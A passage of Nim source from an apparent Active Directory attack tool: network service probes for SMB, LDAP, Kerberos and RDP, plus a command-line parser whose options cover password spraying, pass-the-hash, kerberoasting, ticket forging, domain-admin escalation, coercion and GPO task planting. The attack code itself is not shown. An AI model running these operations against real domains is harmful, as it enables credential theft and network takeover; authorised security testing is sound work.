  49154, 1027, 5666, 646, 5000, 5631, 631, 49153, 8081, 2049, 88, 79, 5800, 106,
  2121, 1110, 49155, 6000, 513, 990, 5357, 427, 49156, 543, 544, 5101, 144, 7,
  389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432, 1900, 3986, 13, 1029,
  9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37, 1000, 3001,
  5001, 82, 10010, 1030, 9090, 2107, 1024, 2103, 6004, 1801, 5050, 19, 8031, 1041,
  255, 2967, 1048, 1049, 1053, 1054, 1056, 1064, 1065, 1066, 1069, 1071, 1074, 1080,
  1081, 1083, 1090, 1100, 1102, 1104, 1105, 1106, 1107, 1108, 1110, 1212, 1234, 1271,
  1300, 1311, 1322, 1352, 1417, 1434, 1455, 1494, 1500, 1503, 1521, 1524, 1533, 1556,
  1580, 1583, 1594, 1641, 1658, 1666, 1687, 1717, 1718, 1719, 1721, 1782, 1812, 1840,
  1862, 1875, 1947, 2002, 2004, 2005, 2006, 2008, 2009, 2010, 2013, 2020, 2021, 2022,
  2030, 2033, 2034, 2035, 2038, 2040, 2041, 2042, 2043, 2045, 2046, 2047, 2065, 2068,
  2099, 2105, 2106, 2111, 2119, 2126, 2135, 2144, 2160, 2161, 2170, 2179, 2190, 2191,
  2196, 2200, 2222, 2251, 2260, 2288, 2301, 2323, 2366, 2381, 2382, 2383, 2393, 2394,
  2399, 2401, 2492, 2500, 2522, 2525, 2557, 2601, 2602, 2604, 2605, 2607, 2608, 2638,
  2701, 2702, 2710, 2718, 2725, 2800, 2809, 2811, 2869, 2875, 2909, 2910, 2920, 2967,
  2968, 2998, 3003, 3005, 3006, 3007, 3011, 3013, 3017, 3030, 3031, 3052, 3071, 3077,
  3080, 3168, 3211, 3221, 3260, 3261, 3268, 3269, 3283, 3300, 3301, 3306, 3322, 3323,
  3324, 3325, 3333, 3351, 3367, 3369, 3370, 3371, 3372, 3389, 3390, 3404, 3476, 3493,
  3517, 3527, 3546, 3551, 3580, 3659, 3689, 3690, 3703, 3737, 3766, 3784, 3800, 3801,
  3809, 3814, 3826, 3827, 3828, 3851, 3869, 3871, 3878, 3880, 3889, 3905, 3914, 3918,
  3920, 3945, 3971, 3998, 4000, 4001, 4002, 4003, 4004, 4005, 4006, 4045, 4111, 4125,
  4126, 4129, 4224, 4242, 4279, 4321, 4343, 4443, 4444, 4445, 4446, 4449, 4550, 4567,
  4662, 4848, 4899, 4900, 4998, 5002, 5003, 5009, 5030, 5033, 5050, 5051, 5054, 5060,
  5061, 5080, 5087, 5100, 5101, 5102, 5120, 5190, 5200, 5214, 5221, 5222, 5225, 5226,
  5269, 5280, 5298, 5357, 5405, 5414, 5431, 5440, 5500, 5510, 5544, 5550, 5555, 5560,
  5566, 5631, 5633, 5666, 5678, 5679, 5718, 5730, 5800, 5801, 5802, 5810, 5811, 5815,
  5822, 5825, 5850, 5859, 5862, 5877, 5900, 5901, 5902, 5903, 5904, 5906, 5907, 5910,
  5911, 5915, 5922, 5925, 5950, 5952, 5959, 5960, 5961, 5962, 5963, 5987, 5988, 5989,
  5998, 5999, 6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6009, 6025, 6059, 6100,
  6101, 6106, 6112, 6123, 6129, 6156, 6346, 6389, 6502, 6510, 6543, 6547, 6565, 6566,
  6567, 6580, 6646, 6666, 6667, 6668, 6669, 6689, 6692, 6699, 6779, 6788, 6789, 6792,
  6839, 6881, 6901, 6969, 7000, 7001, 7002, 7004, 7007, 7019, 7025, 7070, 7100, 7103,
  7106, 7200, 7201, 7402, 7435, 7443, 7496, 7512, 7625, 7627, 7676, 7741, 7777, 7778,
  7800, 7911, 7920, 7921, 7937, 7938, 7999, 8000, 8001, 8002, 8007, 8008, 8009, 8010,
  8011, 8021, 8022, 8031, 8042, 8045, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087,
  8088, 8089, 8090, 8093, 8099, 8100, 8180, 8181, 8192, 8193, 8194, 8200, 8222, 8254,
  8290, 8291, 8292, 8300, 8333, 8400, 8402, 8443, 8500, 8600, 8649, 8651, 8652, 8654,
  8701, 8800, 8873, 8888, 8899, 8994, 9000, 9001, 9002, 9003, 9009, 9010, 9011, 9040,
  9050, 9071, 9080, 9081, 9090, 9091, 9099, 9100, 9101, 9102, 9103, 9110, 9111, 9200,
  9207, 9220, 9290, 9415, 9418, 9485, 9500, 9502, 9503, 9535, 9575, 9593, 9594, 9595,
  9618, 9666, 9876, 9877, 9878, 9898, 9900, 9917, 9929, 9943, 9944, 9968, 9998, 9999,
  10000, 10001, 10002, 10003, 10004, 10009, 10010, 10012, 10024, 10025, 10082, 10180,
  10215, 10243, 10566, 10616, 10617, 10621, 10626, 10628, 10629, 10778, 11110, 11111,
  11967, 12000, 12174, 12265, 12345, 13456, 13722, 13782, 13783, 14000, 14238, 14441,
  14442, 15000, 15002, 15003, 15004, 15660, 15742, 16000, 16001, 16012, 16016, 16018,
  16080, 16113, 16992, 16993, 17877, 17988, 18040, 18101, 18988, 19101, 19283, 19315,
  19350, 19780, 19801, 19842, 20000, 20005, 20031, 20221, 20222, 20828, 21571, 22939,
  23502, 24444, 24800, 25734, 25735, 26214, 27000, 27352, 27353, 27355, 27356, 27715,
  28201, 30000, 30718, 30951, 31038, 31337, 32768, 32769, 32770, 32771, 32772, 32773,
  32774, 32775, 32776, 32777, 32778, 32779, 32780, 32781, 32782, 32783, 32784, 32785,
  33354, 33899, 34571, 34572, 34573, 35500, 38292, 40193, 40911, 41511, 42510, 44176,
  44442, 44443, 44501, 45100, 48080, 49152, 49153, 49154, 49155, 49156, 49157, 49158,
  49159, 49160, 49161, 49163, 49165, 49167, 49175, 49176, 49400, 49999, 50000, 50001,
  50002, 50003, 50006, 50300, 50389, 50500, 50636, 50800, 51103, 51493, 52673, 52822,
  52848, 52869, 54045, 54328, 55055, 55056, 55555, 55600, 56737, 56738, 57294, 57797,
  58080, 60020, 60443, 61532, 61900, 62078, 63331, 64623, 64680, 65000, 65129, 65389
]

proc enrichScanResult(item: var ProbeResult; config: CliConfig) =
  if item.status != psOpen:
    return
  try:
    case item.port
    of 445:
      let probe = waitFor smbclient.probeSmb(item.host, item.port,
        config.timeoutMs, smbclient.defaultSmbNegotiateRequest())
      if probe.speaksSmb:
        item.service = "microsoft-ds"
        var details: seq[string]
        if probe.negotiate.dialect.len > 0:
          details.add "dialect " & probe.negotiate.dialect
        let dom =
          if probe.ntlmChallenge.dnsDomain.len > 0: probe.ntlmChallenge.dnsDomain
          elif probe.ntlmChallenge.netbiosDomain.len > 0: probe.ntlmChallenge.netbiosDomain
          else: ""
        if dom.len > 0:
          details.add "Domain: " & dom
        if probe.ntlmChallenge.dnsComputer.len > 0:
          details.add "Host: " & probe.ntlmChallenge.dnsComputer
        elif probe.ntlmChallenge.netbiosComputer.len > 0:
          details.add "Host: " & probe.ntlmChallenge.netbiosComputer
        if probe.negotiate.signingRequired:
          details.add "signing required"
        elif probe.negotiate.signingEnabled:
          details.add "signing enabled"
        item.version =
          if details.len > 0: "Microsoft Windows SMB (" & details.join(", ") & ")"
          else: "Microsoft Windows SMB"
    of 389, 3268:
      let probe = waitFor ldapclient.probeLdap(item.host, item.port,
        config.timeoutMs)
      if probe.speaksLdap:
        item.service = if item.port == 3268: "ldap-gc" else: "ldap"
        var domain = ""
        for piece in probe.defaultNamingContext.split(','):
          let clean = piece.strip()
          if clean.toLowerAscii().startsWith("dc=") and clean.len > 3:
            if domain.len > 0: domain.add "."
            domain.add clean[3 .. ^1]
        var detail: seq[string]
        if domain.len > 0:
          detail.add "Domain: " & domain
        elif probe.ldapServiceName.len > 0:
          detail.add "Service: " & probe.ldapServiceName
        if probe.dnsHostName.len > 0:
          detail.add "Host: " & probe.dnsHostName
        let product =
          if item.port == 3268: "Microsoft Windows Active Directory Global Catalog"
          else: "Microsoft Windows Active Directory LDAP"
        item.version =
          if detail.len > 0: product & " (" & detail.join(", ") & ")"
          else: product
    of 1433:
      let probe = waitFor mssqlclient.probeMsSql(item.host, item.port,
        config.timeoutMs, config.msSqlEncryption)
      if probe.speaksMsSql:
        item.service = "mssql"
        item.version = if probe.version.len > 0: probe.version else: "TDS prelogin"
    of 3389:
      let probe = waitFor rdpclient.probeRdp(item.host, item.port,
        config.timeoutMs, config.rdpProtocols)
      if probe.speaksRdp:
        item.service = "ms-wbt-server"
        item.version =
          case probe.selectedProtocol
          of 1: "TLS"
          of 2: "CredSSP"
          of 3: "TLS/CredSSP"
          of 8: "HybridEx"
          else: "RDP negotiation"
    of 5985:
      let probe = waitFor winrmclient.probeWinRm(item.host, item.port,
        config.timeoutMs, config.winRmPath)
      if probe.speaksWinRm:
        item.service = "winrm"
        item.version =
          if probe.serverHeader.len > 0: probe.serverHeader
          elif probe.authHeader.len > 0: probe.authHeader
          else: "WSMan"
    else:
      discard
  except CatchableError:
    discard

proc realmFromScanResults(results: seq[ProbeResult]): string =
  for item in results:
    if item.version.contains("DC="):
      var parts: seq[string]
      for piece in item.version.split({' ', ','}):
        let clean = piece.strip()
        if clean.toLowerAscii().startsWith("dc=") and clean.len > 3:
          parts.add clean[3 .. ^1]
      if parts.len > 0:
        return parts.join(".")
  for item in results:
    if item.port == 445 and item.version.len > 0:
      for piece in item.version.splitWhitespace():
        if "." in piece and not piece.toLowerAscii().startsWith("smb"):
          return piece.strip(chars = {' ', ',', ';'})

proc applyDeepScanProbes(results: var seq[ProbeResult]; config: CliConfig) =
  let realm = realmFromScanResults(results)
  for item in results.mitems:
    if item.status != psOpen or item.version.len > 0:
      continue
    try:
      case item.port
      of 88, 464:
        let probe = waitFor probeKerberosTcp(item.host, item.port,
          max(config.timeoutMs, 3000), realm)
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
        elif item.port == 464:
          let udp = waitFor recvUdpKerberos(item.host, 464,
            max(config.timeoutMs, 2000))
          if udp.len > 0:
            item.service = "kpasswd5"
            item.version = "Microsoft Windows kpasswd5 (confirmed via UDP/464)"
            item.banner = printable(udp)
            item.rawBytes = udp
      of 135:
        let probe = waitFor probeDceRpcTcp(item.host, item.port,
          max(config.timeoutMs, 3000))
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
      of 593:
        let probe = waitFor probeRpcOverHttpTcp(item.host, item.port,
          max(config.timeoutMs, 3000))
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
      of 139:
        let probe = waitFor probeNetbiosSessionTcp(item.host, item.port,
          max(config.timeoutMs, 3000))
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
      of 3389:
        let probe = probeRdpTlsTcp(item.host, item.port, max(config.timeoutMs, 3000))
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
      else:
        discard
      if item.version.len == 0 and item.port in [88, 135, 139, 464, 593, 3389]:
        let probe = waitFor probeNmapStyleTcp(item.host, item.port,
          max(config.timeoutMs, 5000))
        if probe.version.len > 0:
          if probe.service.len > 0: item.service = probe.service
          item.version = probe.version
          item.banner = probe.banner
          if probe.rawBytes.len > 0: item.rawBytes = probe.rawBytes
    except CatchableError:
      discard

proc parseCli(): CliConfig =
  result.concurrency = 256
  result.timeoutMs = 1500
  result.retries = 0
  result.port = 0
  result.winRmPath = "/wsman"
  result.msSqlEncryption = 0
  result.rdpProtocols = uint32(rdpclient.RdpProtocolSsl or rdpclient.RdpProtocolCredSsp)
  result.ridBruteStart = 500'u32
  result.ridBruteEnd = 4000'u32
  result.ldapDnsTtl = 3600
  result.krb5DurationHours = 10
  result.krb5Rid = 500'u32
  result.smbCaptureSeconds = 15
  result.smbCaptureInterval = 1

  const valueShort = {'u', 'p', 'H', 'd'}
  const valueLong = ["username", "password", "hash", "domain", "port",
    "concurrency", "timeout", "cmd", "command", "dialects", "path",
    "spray-delay", "max-attempts-per-user",
    "encrypt", "rdp-proto", "rid-range", "limit", "query", "base", "filter", "attrs",
    "fields", "create", "name", "dn", "add", "replace", "delete", "set", "count", "mapping",
    "ldif", "user", "spn", "from", "to", "cert", "new-pass", "principal",
    "rights", "owner", "link", "unlink", "target", "retries", "log", "rollback-out",
    "group", "member", "shadow-out",
    "object-type", "inherited-object-type", "ace-flags", "top-ports", "T",
    "share", "remote", "local", "object", "put", "get",
    "add-computer", "computer", "computer-pass", "computer-ou", "ou",
    "computer-dns", "delegate-from", "delegate-to", "restore-to", "new-name", "move-to",
    "bloodhound-out", "ca", "template", "out", "pfx", "upn", "dns-name",
    "blob-out", "key", "ccache", "krb5-config", "krb5-conf", "zone", "record", "type", "data", "ttl",
    "database", "ole", "clr", "xp-link", "ole-link", "clr-link", "query-file", "link-chain",
    "exec",
    "proxy", "realm", "request", "forge", "sid", "extra-sid", "rid", "groups", "duration", "start-offset", "target-realm",
    "service", "altservice", "alt-service", "aes-key", "kdc-key",
    "startup", "schtask", "task-name", "task-cmd", "task-args", "task-user", "script-params",
    "on-behalf-of", "listener", "coerce-target", "capture-host", "capture-user", "capture-password", "capture-pass", "capture-hash", "capture-domain", "capture-out", "ticket-user", "ticket-service", "capture-seconds", "capture-interval", "script-path", "bind", "auth",
    "socks-port", "pid", "socks-remote", "socks-task", "control-port",
    "new-hash", "target-dn"]
  var rawArgs = commandLineParams()
  var normalized: seq[string] = @[]
  var index = 0
  while index < rawArgs.len:
    var token = rawArgs[index]
    var consumed = false
    if token.len == 3 and token[0] == '-' and token[1] != '-' and
        token in ["-oG", "-oC", "-oX", "-Pn"]:
      token = "-" & token
    elif token.len == 3 and token[0] == '-' and token[1] == 'T' and
        token[2] in {'0'..'9'}:
      token = "--T:" & $token[2]
    if token == "--rid-brute" and index + 1 < rawArgs.len:
      var numeric = rawArgs[index + 1].len > 0
      for ch in rawArgs[index + 1]:
        if ch notin {'0'..'9'}:
          numeric = false
          break
      if numeric:
        normalized.add token & ":" & rawArgs[index + 1]
        inc index, 2
        consumed = true
    if not consumed and token.len >= 2 and token[0] == '-' and token[1] != '-' and
        ':' notin token and '=' notin token and token.len == 2 and
        token[1] in valueShort and index + 1 < rawArgs.len:
      normalized.add token & ":" & rawArgs[index + 1]
      inc index, 2
      consumed = true
    elif token.len > 2 and token[0] == '-' and token[1] == '-' and
        ':' notin token and '=' notin token and
        token[2 .. ^1] in valueLong and index + 1 < rawArgs.len and
        not rawArgs[index + 1].startsWith("-"):
      normalized.add token & ":" & rawArgs[index + 1]
      inc index, 2
      consumed = true
    if not consumed:
      normalized.add token
      inc index
  var parser = initOptParser(
    normalized,
    shortNoVal = {'k', 'h'},
    longNoVal = @["json", "ssl", "kerberos", "local-auth", "shares", "users",
      "groups", "pass-pol", "loggedon-users", "sessions", "disks", "rid-brute", "local-admins",
      "computers", "asreproast", "kerberoast", "trusts", "gpos", "dcs",
      "admins", "dns", "open", "help", "debug-probe", "udp", "no-color", "F",
      "Pn", "oG", "oC", "oX", "shell", "cli", "ldaps", "gc", "anonymous", "modify",
      "make-dadmin", "make-kerberoast", "make-asreproast", "set-rbcd",
      "shadow-creds", "get-laps", "enable", "disable", "set-password", "set-owner", "set",
      "remove-ace", "delete-user", "delete-computer", "delete-group", "delete",
      "ldif", "nested-groups", "acl", "include-deleted", "gpo", "add", "laps-schema",
      "deny", "allow", "exact", "ls", "no-bump", "dry-run", "adcs", "startup", "schtask", "create-gpo", "delegate",
      "adcs-request", "adcs-auth", "adcs-rpc", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
      "get-gmsa", "dns-add", "dns-delete", "dns-replace", "adcs-template",
      "add-member", "remove-member", "restore-deleted", "move", "bloodhound", "recursive", "full", "trust-keys",
      "lockout-aware", "schannel", "reverse",
      "user-process",
      "enum-danger", "enum-impersonate", "enable-xp", "enable-ole", "enable-clr",
      "success", "coerce", "capture-tickets", "attack", "set-scriptpath", "kill",
      "kerberos-delegate", "set-hash", "raw-ticket"]
  )
  for kind, key, value in parser.getopt():
    case kind
    of cmdArgument:
      if result.protocol.len == 0:
        result.protocol = normalizeExecProto(key)
      else:
        result.targets.add key
    of cmdLongOption, cmdShortOption:
      case key
      of "h", "help":
        usage(result.protocol)
        quit 0
      of "port":
        result.ports = parsePortSpec(value)
        if result.ports.len > 0:
          result.port = result.ports[0]
      of "concurrency":
        result.concurrency = parseInt(value)
      of "timeout":
        result.timeoutMs = parseInt(value)
      of "retries":
        result.retries = parseInt(value)
      of "spray-delay":
        result.sprayDelayMs = parseInt(value)
      of "max-attempts-per-user":
        result.maxAttemptsPerUser = parseInt(value)
      of "lockout-aware":
        result.lockoutAware = true
      of "proxy":
        result.proxySpec = value
      of "json":
        result.jsonOutput = true
      of "open":
        result.openOnly = true
      of "success":
        result.successOnly = true
      of "debug-probe":
        result.debugProbe = true
      of "udp":
        result.udpScan = true
      of "no-color":
        output.disableColor()
        result.disableColor = true
      of "top-ports":
        result.topPorts = parseInt(value)
        if result.topPorts < 1 or result.topPorts > TopTcpPorts.len:
          raise newException(ValueError,
            "--top-ports must be between 1 and " & $TopTcpPorts.len)
      of "F":
        result.topPorts = 100
      of "Pn":
        result.skipPing = true
      of "oG":
        result.outputFormat = "grepable"
      of "oC":
        result.outputFormat = "csv"
      of "oX":
        result.outputFormat = "xml"
      of "log":
        result.logFile = value
      of "rollback-out":
        result.rollbackOut = value
      of "dry-run":
        result.dryRun = true
      of "share":
        let bsPos = value.find('\\')
        if bsPos >= 0:
          result.shareName = value[0 ..< bsPos]
          let rest = value[bsPos + 1 .. ^1].strip(chars = {'\\', '/'})
          if rest.len > 0 and result.remotePath.len == 0:
            result.remotePath = rest
        else:
          result.shareName = value
      of "remote":
        if result.remotePath.len > 0:
          result.remotePath = result.remotePath.strip(chars={'\\','/'}, leading=false) & "\\" & value
        else:
          result.remotePath = value
      of "local":
        result.localPath = value
      of "T":
        case value
        of "0":
          result.concurrency = 1; result.timeoutMs = 300_000; result.retries = 1
        of "1":
          result.concurrency = 1; result.timeoutMs = 15_000;  result.retries = 1
        of "2":
          result.concurrency = 8;  result.timeoutMs = 5_000;  result.retries = 1
        of "3":
          result.concurrency = 256; result.timeoutMs = 1500; result.retries = 0
        of "4":
          result.concurrency = 512; result.timeoutMs = 1000; result.retries = 1
        of "5":
          result.concurrency = 1024; result.timeoutMs = 500; result.retries = 0
        else:
          raise newException(ValueError,
            "-T expects 0..5, e.g. -T4 (aggressive)")
      of "u", "username":
        if fileExists(value):
          for line in lines(value):
            let t = line.strip()
            if t.len > 0: result.usernames.add t
        else:
          result.username = value
      of "p":
        if fileExists(value):
          for line in lines(value):
            let t = line.strip()
            if t.len > 0: result.passwords.add t
        else:
          result.password = value
      of "password":
        if result.protocol == "ldap" and
            (result.ldapCreateKind.len > 0 or result.ldapSetPassword or result.ntlmHash.len > 0):
          result.ldapNewPass = value
        else:
          if fileExists(value):
            for line in lines(value):
              let t = line.strip()
              if t.len > 0: result.passwords.add t
          else:
            result.password = value
      of "H", "hash":
        var sanity = value.strip()
        if ":" in sanity: sanity = sanity.split(':')[^1]
        sanity = sanity.replace(" ", "")
        if sanity.len != 32:
          raise newException(ValueError,
            "-H expects an NT hash (32 hex chars) or LM:NT pair; got " &
            $sanity.len & " chars. Use -p for plaintext passwords.")
        for c in sanity:
          if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
            raise newException(ValueError,
              "-H value contains non-hex character '" & $c &
              "'. Use -p for plaintext passwords.")
        result.ntlmHash = value
      of "d", "domain":
        result.domain = value
      of "cmd", "command":
        result.remoteCommand = value
      of "exec":
        if result.protocol == "secrets":
          result.secretsExecMethod = value
      of "ole":
        result.mssqlOleCommand = value
      of "clr":
        result.mssqlClrCommand = value
      of "query-file":
        result.mssqlQueryFile = value
      of "xp-link":
        result.mssqlXpLinkServer = value
      of "ole-link":
        result.mssqlOleLinkServer = value
      of "clr-link":
        result.mssqlClrLinkServer = value
      of "link-chain":
        result.mssqlLinkChain = @[]
        for item in value.split(','):
          let clean = item.strip()
          if clean.len > 0:
            result.mssqlLinkChain.add clean
      of "database":
        result.mssqlDatabase = value
      of "object":
        result.dcomObject = value
      of "shell":
        result.shellMode = true
      of "cli":
        result.cliMode = true
      of "enum-danger":
        result.mssqlEnumDanger = true
      of "enum-impersonate":
        result.mssqlEnumImpersonate = true
      of "enable-xp":
        result.mssqlEnableXp = true
      of "enable-ole":
        result.mssqlEnableOle = true
      of "enable-clr":
        result.mssqlEnableClr = true
      of "recursive":
        result.recursiveOp = true
      of "full":
        if result.protocol == "secrets":
          result.secretsFull = true
      of "online":
        if result.protocol == "secrets":
          result.secretsOnline = true
      of "ssl":
        result.useSsl = true
      of "trust-keys":
        result.dcSyncTrustKeys = true
      of "ldaps":
        result.useSsl = true
        if result.port == 0: result.port = 636
      of "gc":
        if result.port == 0: result.port = if result.useSsl: 3269 else: 3268
      of "anonymous":
        result.username = ""
        result.password = ""
        result.ntlmHash = ""
      of "schannel":
        result.ldapSchannel = true
        result.useSsl = true
        if result.port == 0:
          result.port = 636
      of "k", "kerberos":
        result.kerberos = true
      of "kerberos-delegate":
        result.kerberosDelegate = true
      of "local-auth":
        result.localAuth = true
      of "shares":
        result.shares = true
      of "users":
        result.users = true
      of "groups":
        if result.protocol == "kerberos" and value.len > 0:
          result.krb5Groups = value
        else:
          result.groups = true
      of "pass-pol":
        result.passwordPolicy = true
      of "loggedon-users":
        result.loggedOnUsers = true
      of "sessions":
        result.sessions = true
      of "disks":
        result.disks = true
      of "rid-brute":
        result.ridBrute = true
        if value.len > 0:
          result.ridBruteEnd = uint32(parseInt(value))
      of "local-admins":
        result.localAdmins = true
      of "coerce":
        result.smbCoerce = true
      of "coerce-target":
        result.smbCoerceTarget = value
      of "capture-tickets":
        result.smbCaptureTickets = true
      of "capture-host":
        result.smbCaptureHost = value
      of "capture-user":
        result.smbCaptureUser = value
      of "capture-password", "capture-pass":
        result.smbCapturePassword = value
      of "capture-hash":
        result.smbCaptureHash = value
      of "capture-domain":
        result.smbCaptureDomain = value
      of "capture-out":
        result.smbCaptureOut = value
      of "ticket-user":
        result.smbTicketUser = value
      of "ticket-service":
        result.smbTicketService = value
      of "capture-seconds":
        try: result.smbCaptureSeconds = parseInt(value) except: discard
      of "capture-interval":
        try: result.smbCaptureInterval = parseInt(value) except: discard
      of "raw-ticket":
        result.smbRawTicket = true
      of "set-hash":
        result.smbSetHash = true
      of "listener":
        result.coerceListener = value
      of "attack":
        result.ldapPasswdNotReqdAttack = true
      of "set-scriptpath":
        result.ldapSetScriptPath = true
      of "script-path":
        result.ldapScriptPath = value
      of "bind":
        result.socksBindAddr = value
      of "auth":
        result.socksAuth = value
      of "socks-port":
        try: result.socksPort = parseInt(value) except: discard
      of "control-port":
        try: result.socksControlPort = parseInt(value) except: discard
      of "kill":
        result.socksKill = true
      of "pid":
        result.socksPid = value
      of "socks-remote":
        result.socksRemotePath = value
      of "socks-task":
        result.socksTaskName = value
      of "user-process":
        result.socksUserProcess = true
      of "reverse":
        result.socksReverse = true
      of "computers":
        result.computers = true
      of "asreproast":
        result.asreproast = true
      of "kerberoast":
        result.kerberoast = true
      of "trusts":
        result.trusts = true
      of "gpos":
        result.gpos = true
      of "dcs":
        result.dcs = true
      of "admins":
        result.admins = true
      of "dns":
        result.dns = true
      of "query":
        if result.protocol == "mssql":
          result.customLdapFilter = value
        elif result.protocol == "postgres":
          result.postgresQuery = value
        else:
          case value.toLowerAscii()
          of "users": result.users = true
          of "computers": result.computers = true
          of "groups": result.groups = true
          of "trusts": result.trusts = true
          of "admins": result.admins = true
          of "asreproast": result.asreproast = true
          of "kerberoast": result.kerberoast = true
          of "gpos": result.gpos = true
          of "schema": result.ldapSchema = true
          of "config": result.ldapConfig = true
          of "fgpp": result.ldapFgpp = true
          of "deleted": result.ldapDeleted = true
          of "locked", "locked-users": result.ldapLocked = true
          of "expired-passwords": result.ldapExpiredPasswords = true
          of "stale-users": result.ldapStaleUsers = true
          of "never-logged-on": result.ldapNeverLoggedOn = true
          of "sites": result.ldapSites = true
          of "subnets": result.ldapSubnets = true
          of "nested-groups": result.ldapNestedGroups = true
          of "acl": result.ldapAcl = true
          of "dcs": result.dcs = true
          of "dns": result.dns = true
          of "certs", "certificates", "cert-inventory", "certificate-inventory":
            result.ldapCertInventory = true
          of "unconstrained": result.ldapUnconstrained = true
          of "constrained": result.ldapConstrained = true
          of "rbcd-targets", "rbcd": result.ldapRbcdTargets = true
          of "passwd-notreqd", "passwd-not-reqd", "no-password": result.ldapPasswdNotReqd = true
          of "dont-expire", "dont-expire-password", "no-expiry": result.ldapDontExpire = true
          of "admincount", "admin-count": result.ldapAdminCount = true
          else: result.customLdapFilter = value
      of "filter":
        result.customLdapFilter = value
      of "base":
        result.ldapBase = value
      of "count":
        result.ldapCountKind = value.toLowerAscii()
      of "attrs", "fields":
        for item in value.split(','):
          let clean = item.strip()
          if clean.len > 0:
            result.ldapAttrs.add clean
      of "add-computer":
        result.addComputer = true
        result.computerName = value
      of "new-hash":
        result.smbNewHash = value
      of "computer":
        result.computerName = value
        if result.protocol == "addcomputer":
          result.addComputer = true
      of "computer-pass":
        result.computerPassword = value
      of "computer-ou", "ou":
        result.computerOu = value
      of "computer-dns":
        result.computerDnsHost = value
      of "delegate-from":
        result.delegateFrom = value
      of "delegate-to":
        result.delegateTo = value
      of "create":
        result.ldapCreateKind = value.toLowerAscii()
      of "create-gpo":
        result.ldapGpoCreate = true
      of "delegate":
        if result.ldapGpo:
          result.ldapGpoDelegate = true
      of "name":
        result.ldapName = value
      of "dn":
        if result.ldapModifyDn.len > 0 or result.ldapDeleteDn.len > 0:
          result.ldapModifyDn = value
          result.ldapDeleteDn = value
        else:
          result.ldapAddDn = value
          result.ldapModifyDn = value
          result.ldapDeleteDn = value
      of "modify":
        discard
      of "add":
        if result.ldapAcl and value.len == 0:
          result.ldapAclAdd = true
        else:
          result.ldapModifyDn = result.ldapModifyDn
          result.ldapAddAttrs.add value
      of "replace":
        result.ldapReplaceAttrs.add value
      of "set":
        if result.ldapGpo and value.len == 0:
          result.ldapGpoSet = true
        else:
          result.ldapReplaceAttrs.add value
      of "delete":
        if value.contains("="):
          result.ldapDeleteAttrs.add value
        elif result.ldapGpo and value.len > 0:
          result.ldapGpoDelete = value
        else:
          result.ldapDeleteObject = true
          if value.len > 0:
            result.ldapDeleteDn = value
      of "ldif":
        if value.len > 0: result.ldapLdif = value
        else: result.ldapLdifOutput = true
      of "user":
        result.ldapUser = value
      of "principal":
        result.ldapAclPrincipal = value
      of "rights":
        for item in value.split(','):
          let clean = item.strip()
          if clean.len > 0: result.ldapAclRights.add clean
      of "deny":
        result.ldapAclDeny = true
      of "allow":
        result.ldapAclDeny = false
      of "exact":
        result.ldapAclExact = true
      of "object-type":
        result.ldapAclObjectType = value
      of "inherited-object-type":
        result.ldapAclInheritedObjectType = value
      of "ace-flags":
        let clean = value.strip().toLowerAscii()
        result.ldapAclAceFlags =
          if clean.startsWith("0x"): parseHexInt(clean[2 .. ^1])
          else: parseInt(clean)
      of "owner":
        result.ldapOwner = value
      of "group":
        result.ldapGroup = value
      of "member":
        result.ldapUser = value
      of "spn":
        if result.protocol == "mssql":
          result.mssqlSpnOverride = value
        else:
          result.ldapSpn = value
      of "from":
        result.ldapFrom = value
      of "to":
        result.ldapTo = value
      of "target":
        result.ldapGpoTarget = value
      of "target-dn":
        result.ldapBadSuccessorTarget = value
      of "make-dadmin":
        result.ldapMakeDadmin = true
      of "make-kerberoast":
        result.ldapMakeKerberoast = true
      of "make-asreproast":
        result.ldapMakeAsreproast = true
      of "set-rbcd":
        result.ldapSetRbcd = true
      of "gpo":
        result.ldapGpo = true
      of "link":
        if result.protocol == "mssql":
          result.mssqlLinkServer = value
        else:
          result.ldapGpoLink = value
      of "unlink":
        result.ldapGpoUnlink = value
      of "put":
        if result.ldapGpo:
          result.ldapGpoPut = value
        else:
          discard
      of "get":
        if result.ldapGpo:
          result.ldapGpoGet = value
      of "ls":
        if result.ldapGpo:
          result.ldapGpoLs = true
        else:
          result.ftpLs = true
      of "no-bump":
        result.ldapGpoNoBump = true
      of "startup":
        if result.ldapGpo:
          result.ldapGpoStartup = true
      of "schtask":
        if result.ldapGpo:
          result.ldapGpoSchedTask = true
      of "task-name":
        result.ldapGpoTaskName = value
      of "task-cmd":
        result.ldapGpoTaskCmd = value
      of "task-args":
        result.ldapGpoTaskArgs = value
      of "task-user":
        result.ldapGpoTaskUser = value
      of "script-params":
        result.ldapGpoScriptParams = value
      of "shadow-creds":
        result.ldapShadowCreds = true
      of "shadow-out":
        result.ldapShadowOut = value
      of "get-laps":
        result.ldapGetLaps = true
      of "laps-schema":
        result.ldapLapsSchema = true
      of "cert-inventory":
        result.ldapCertInventory = true
      of "cert-map":
        result.ldapCertMap = true
      of "remove-map":
        result.ldapCertMapRemove = true
      of "mapping":
        result.ldapCertMapping = value
      of "adcs":
        result.ldapAdcs = true
      of "adcs-request":
        result.ldapAdcsRequest = true
      of "adcs-rpc":
        result.ldapAdcsRpc = true
      of "adcs-auth":
        result.ldapAdcsAuth = true
      of "ca":
        if result.protocol == "krb5conf" or fileExists(value):
          result.krb5CaPath = value
        else:
          result.ldapAdcsCa = value
      of "template":
